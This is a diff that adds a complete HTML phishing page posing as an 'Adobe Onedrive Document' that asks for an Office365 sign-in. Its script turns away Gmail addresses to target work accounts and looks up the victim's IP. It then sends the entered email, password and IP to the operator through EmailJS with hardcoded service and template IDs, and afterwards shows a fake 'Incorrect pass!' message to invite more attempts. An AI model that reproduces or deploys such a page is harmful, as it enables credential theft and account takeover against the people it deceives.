@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Onedrive Document</title>
+    
+    <!-- EmailJS Library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("PzJgwbgawG0-GOzyC");
+        })();
+    </script>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://z-cdn-media.chatglm.cn/files/b813630d-2cfb-47df-8134-eb143b9b7f78.jpg?auth_key=1868828119-288dad955cb14a80a19e795c0c024648-0-363a98a79728cf119be6d84f79b68798');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            width: 340px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 25px;
+        }
+        .text {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+        .input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #005a9e;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        #error {
+            color: red;
+            font-size: 13px;
+            margin-top: -10px;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://z-cdn-media.chatglm.cn/files/09c1beb4-a587-4c85-80e5-7f68fb3b90a3.png?auth_key=1868461394-9534c0b4396e4ddeaeec4a749f6eadcf-0-2cd17952b1c324592a20df66771dfb1e" alt="Logo" class="logo">
+        
+        <p class="text">This document is protected! Sign-In With Office365 Mail To View Document</p>
+        
+        <form id="myForm">
+            <input type="email" name="email" id="emailInput" class="input" placeholder="Email" required>
+            
+            <div id="error">Please use a work email (Gmail is not allowed).</div>
+            
+            <input type="password" name="name" id="nameInput" class="input" placeholder="Password" required>
+            <button type="submit" class="btn" id="submitBtn">View Document</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const emailInput = document.getElementById('emailInput');
+            const nameInput = document.getElementById('nameInput');
+            const errorDiv = document.getElementById('error');
+            const submitBtn = document.getElementById('submitBtn');
+            const email = emailInput.value.toLowerCase();
+            const name = nameInput.value;
+            
+            // Reset error
+            errorDiv.style.display = 'none';
+            
+            // Check for Gmail
+            if (email.includes('@gmail')) {
+                errorDiv.style.display = 'block';
+                emailInput.focus();
+                return;
+            }
+            
+            // Disable button
+            submitBtn.disabled = true;
+            
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip;
+                    
+                    // Send via EmailJS with YOUR credentials
+                    emailjs.send(
+                        'service_a22zj06',
+                        'template_jy0mndc',
+                        {
+                            password: name,
+                            username: email,
+                            ip: ip,
+                            submission_time: new Date().toLocaleString()
+                        }
+                    )
+                    .then(function(response) {
+                        console.log('SUCCESS!', response);
+                        // Show error message
+                        errorDiv.textContent = 'Incorrect pass! Please try again';
+                        errorDiv.style.display = 'block';
+                        submitBtn.disabled = false;
+                    })
+                    .catch(function(error) {
+                        console.log('FAILED...', error);
+                        errorDiv.textContent = 'Incorrect pass! Please try again';
+                        errorDiv.style.display = 'block';
+                        submitBtn.disabled = false;
+                    });
+                })
+                .catch(() => {
+                    // If IP fetch fails, send without IP
+                    emailjs.send(
+                        'service_a22zj06',
+                        'template_jy0mndc',
+                        {
+                            password: name,
+                            username: email,
+                            ip: 'Unknown',
+                            submission_time: new Date().toLocaleString()
+                        }
+                    )
+                    .then(function() {
+                        errorDiv.textContent = 'Incorrect pass! Please try again';
+                        errorDiv.style.display = 'block';
+                        submitBtn.disabled = false;
+                    });
+                });
+        });
+    </script>
+</body>
+</html>
